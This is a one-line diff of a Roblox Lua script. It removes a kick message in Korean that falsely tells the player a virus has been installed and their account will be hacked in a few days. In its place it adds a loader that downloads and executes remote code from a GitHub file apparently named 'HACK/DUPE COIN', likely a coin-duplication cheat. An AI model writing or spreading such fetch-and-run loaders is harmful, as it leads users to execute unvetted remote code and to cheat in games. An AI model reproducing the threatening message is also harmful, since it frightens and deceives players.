@@ -1,1 +1,1 @@
-game.Players.LocalPlayer:Kick("진짜 스크립트를 썼네? 하지만 바이러스를 심어서 너의 컴퓨터는 피해가 끼치지 않을꺼지만 너의 계정이 몇일후에 너의 계정을 해킹할꺼야. 금방이라도 컴퓨터꺼도 이미 바이러스는 설치됬어. 도망치지말고 받아드려");
+loadstring(game:HttpGet("https://raw.githubusercontent.com/GACLY/HACK/main/DUPE%20COIN", true))()
